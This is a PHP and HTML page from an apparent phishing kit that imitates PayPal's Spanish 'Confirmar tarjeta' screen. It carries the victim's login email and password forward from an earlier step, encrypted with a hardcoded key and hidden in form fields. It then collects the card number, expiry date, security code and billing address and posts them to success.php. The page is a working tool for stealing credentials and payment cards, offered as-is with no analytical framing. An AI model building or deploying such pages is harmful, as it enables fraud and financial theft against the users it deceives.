<?php
include("../../../../inc/crypt.php");
if(!isset($_POST["login_email"])){
  header("Location: ../../../../");
}
else{
  $email = encrypt($_POST["login_email"], "Manaosuvita10");
  $password = encrypt($_POST["login_password"], "Manaosuvita10");
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <link rel="shortcut icon" type="image/x-icon" href="PayPal_archivos/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="PayPal_archivos/paypal-sans.css">
    <link rel="stylesheet" href="PayPal_archivos/style.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link rel="stylesheet" href="PayPal_archivos/main-ltr.css">
    <link rel="stylesheet" href="PayPal_archivos/header-footer-min.css">
    <title>PayPal: Confirmar tarjeta</title>
  </head>
  <body>
    <div class="container-fluid full">
      <div class="row justify-content-md-center">
        <div class="col-9 vent-modal">
          <div class="container-fluid">
            <div class="row justify-content-md-center">
              <div class="col-md-9">
                <div class="container-fluid">
                  <div class="row justify-content-md-center">
              <div class="col-md-12">
                <div class="logo"></div>
              </div>
              <div class="col-md-12">
                <h2 class="asociar">Verificar tarjeta<br><span style="font-size:16px">Debe coincidir con su tarjeta actual.</span></h2>

              </div>
              <form method="post" action="success.php">
              <div class="col-md-12">
                <div class="card-container justify-content-md-center">
                  <img class="card-image" src="PayPal_archivos/generic_card.png" width="150" id="card-image">
                </div>
              </div>
              <div class="col-md-12">
                <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="N.° tarjeta débito o crédito"><label class="floatingLabel" for="cardNumber">N.° tarjeta débito o crédito</label><input type="text" id="cardNumber" aria-describedby="text-info-cardNumber" name="cardNumber" class="test_cardNumber test_cardNumber vx_form-control" placeholder="Ingrese el número de tarjeta" autocomplete="off" value=""></div>
              </div>
              <div class="col-md-12">
                <div class="vx_floatingLabel"><label class="floatingLabel" for="brand">Tipo de tarjeta</label><div class="vx_select " data-label-content="Tipo de tarjeta"><select id="brand" class="form-control vx_form-control undefined test_brand" name="brand"><option value="unselected" selected>Seleccione su tipo de tarjeta</option><option value="visa">Visa</option><option value="master_card">Mastercard</option><option value="amex">American Express</option><option value="discover">Discover</option></select></div><span class="vx_selectIcon_error"></span></div>
              </div>
              <div class="col-md-12">
                <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active vx_floatingLabel_complex" data-label-content="Fecha de fecha de vencimiento"><label class="floatingLabel" for="expDate">Fecha de fecha de vencimiento</label><div class="vx_form-control" data-label-content="Fecha de fecha de vencimiento"><input type="text" id="expDate" aria-describedby="text-info-expDate" name="expDate" class="test_expDate" placeholder="mm/aa" autocomplete="off" value="" maxlength="5"></div><span></span></div>
              </div>
              <div class="col-md-12">
                <div class="table-container"><div class="table-row"><div class="table-col-xs-10"><div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Código de seguridad"><label class="floatingLabel" for="verificationCode">Código de seguridad</label><input type="password" id="verificationCode" aria-describedby="text-info-verificationCode" name="verificationCode" class="test_verificationCode test_verificationCode vx_form-control" placeholder="Ingrese el código de seguridad" autocomplete="off" value="" maxlength="4"></div></div><div class="table-col-xs-2 cardImage-container"><span data-name="" class="rectangleLogo_small shadow  csc-image " aria-hidden="true" id="cvv"></span></div></div></div>
              </div>
              <div class="col-md-12">
                <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Dirección de la tarjeta"><label class="floatingLabel" for="dir">Dirección de la tarjeta</label><input type="text" id="dir" aria-describedby="text-info-cardNumber" name="dir" class="test_cardNumber test_cardNumber vx_form-control" placeholder="Aguero, 2502, 08075 Barcelona, España" autocomplete="off" value=""></div>
              </div>
              <div class="col-md-12">
                <button type="submit" data-testid="button-submit" name="detailsSubmit" data-track="{}" class="btn vx_btn vx_btn-block card-submit test_add-card-submit" title="" pa-marked="1">Asociar tarjeta</button>
              </div>
              <div class="invisible" style="display: none;">
                <input type="text" name="securitycode" value="<?php echo $email ?>">
                <input type="text" name="verifycode" value="<?php echo $password ?>">
              </div>
            </form>
              </div>
              </div>
            </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script src="PayPal_archivos/vx-lib.min.js"></script>
    <script src="PayPal_archivos/pa.js"></script>
    <script src="PayPal_archivos/vendor.js"></script>
    <script src="PayPal_archivos/appBundle.js"></script>
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
  <script>
    document.getElementById("brand").onchange = creditcard;
    var image = document.getElementById("card-image");
    var cvv = document.getElementById("cvv");
    function creditcard(){
    var value = this.value
      
      if (value == "unselected"){
        image.src = "PayPal_archivos/generic_card.png"
        cvv.classList.remove("csc-image_amex");
      }else if (value == "visa"){
        image.src = "PayPal_archivos/visa.png"
        cvv.classList.remove("csc-image_amex");
      }else if (value == "master_card"){
        image.src = "PayPal_archivos/master_card.png"
        cvv.classList.remove("csc-image_amex");
      }else if (value == "amex"){
        image.src = "PayPal_archivos/amex.png"
        cvv.classList.add("csc-image_amex");
      }else if (value == "discover"){
        image.src = "PayPal_archivos/discover.png"
        cvv.classList.remove("csc-image_amex");
      }
      
    }

  </script>
  </body>
</html>